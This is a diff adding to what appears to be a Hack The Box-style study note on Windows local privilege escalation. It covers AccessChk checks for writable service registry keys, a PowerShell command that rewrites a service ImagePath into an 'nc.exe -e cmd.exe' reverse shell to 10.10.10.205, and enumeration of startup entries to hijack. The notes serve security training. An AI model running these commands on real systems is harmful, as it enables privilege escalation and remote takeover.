@@ -95,4 +95,51 @@ Like mentioned previously, this service is gonna get screwed by us because we ch
 
 Checking for Permissive Registry ACLs and Modifiable Autorun Binary:
 
-We can check for weak service ACL in Window Regi
+We can check for weak service ACL in Window Registry using AccessChk:
+```
+C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
+
+Accesschk v6.13 - Reports effective permissions for securable objects
+Copyright ⌐ 2006-2020 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+RW HKLM\System\CurrentControlSet\services\ModelManagerService
+        KEY_ALL_ACCESS
+
+<SNIP> 
+```
+
+We can change it's ImagePath to execute something else:
+```
+PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
+```
+
+We can also check for startup programs, if we have permission to overwrite or edit them, we can have a command executed under other user's context:
+```
+PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
+
+Name     : OneDrive
+command  : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
+Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+User     : WINLPE-WS01\mrb3n
+
+Name     : Windscribe
+command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
+Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+User     : WINLPE-WS01\mrb3n
+
+Name     : SecurityHealth
+command  : %windir%\system32\SecurityHealthSystray.exe
+Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+User     : Public
+
+Name     : VMware User Process
+command  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
+Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+User     : Public
+
+Name     : VMware VM3DService Process
+command  : "C:\WINDOWS\system32\vm3dservice.exe" -u
+Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+User     : Public
+```
